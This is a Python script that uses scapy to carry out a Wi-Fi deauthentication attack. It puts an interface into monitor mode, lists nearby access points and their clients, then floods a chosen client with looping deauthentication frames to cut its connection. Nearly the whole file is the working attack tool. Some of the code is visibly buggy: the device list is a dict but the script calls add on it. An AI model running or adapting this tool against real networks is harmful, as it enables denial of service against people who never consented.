#!/usr/bin/env python

import sys, os, signal
from multiprocessing import Process
import netifaces
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp, Dot11, Dot11Elt, RadioTap, Dot11Deauth

aps = {}  # dictionary to store unique APs networks
devices = {} #devices
ac_point = ""


# process unique sniffed Beacons and ProbeResponses.
def sniffAP(p):
    if ((p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp))
            and not p[Dot11].addr3 in aps):
        ssid = p.info.decode()
        bssid = p[Dot11].addr3
        channel = int(ord(p[Dot11Elt:3].info))
        print("%02d  %s  %s" % (int(channel), bssid, ssid))
        aps[ssid]=bssid
        channel = random.randrange(1, 14)
        os.system("iw dev %s set channel %d" % (user_interface, channel))
        time.sleep(0.5)



def list_of_net():
    mylist = netifaces.interfaces()
    return mylist


def monitor_mode(user_interface):
    os.system("sudo ifconfig " + user_interface + " down")
    os.system("sudo iwconfig " + user_interface + " mode monitor")
    os.system("sudo ifconfig " + user_interface + " up")


def deauthAttack(target_mac, apName, interval, count, loop, iface,verbose=1):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=apName, addr3=apName)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=interval, count=count, loop=loop, iface=iface,verbose=verbose)

def handle_pkt(p):
    src = p[Dot11].addr1
    dest = p[Dot11].addr2
    bssid = p[Dot11].addr3
    if ac_point == src:
        devices.add(dest)
            
							
                   

if __name__ == "__main__":
    l = list_of_net()
    t=len(l)
    for k in range(0, t):
        print(k+1,"\t",l[k])

    
	
    user_number = input ("Enter interface by line number\n")
    user_interface=l[int(user_number)-1]
    print("the interface you choose is :",user_interface)
    print("~~~~Monitor mode~~~~~")
    monitor_mode(user_interface)
    print("~~~~!!Monitor mode complite!!~~~~~")
    print("~~~~sniffing~~~~~")
    

   # Print the program header
    print("CH\t\tBSSID\t\tSSID")
    sniff(iface=user_interface, timeout=60, prn=sniffAP)
    i=0
    print ("This is the list: \n")
    for k in aps.keys():
        i=i+1
        val=aps[k]
        print(i,"\t",val,"\t",k)

    point= input("Please enter the full AP mac adrress:\n")
    ac_point=point
    print("you choose:\n",point)
    
    print("~~~scanning  devices in ",point,"~~~~")
    sniff(iface=user_interface, timeout=60 , prn=handle_pkt)
    print("BSSID\n")
    for d in devices:
        print(d)
    ac_add=input("enter ap mac ")
    mac_attack=""
    mac_attack = input ("Enter client to attack: in format ff:ff:ff:ff\n")
    print("~~!!attacking~~")
    deauthAttack(mac_attack, ac_add, 0.1, 100, 1, user_interface)



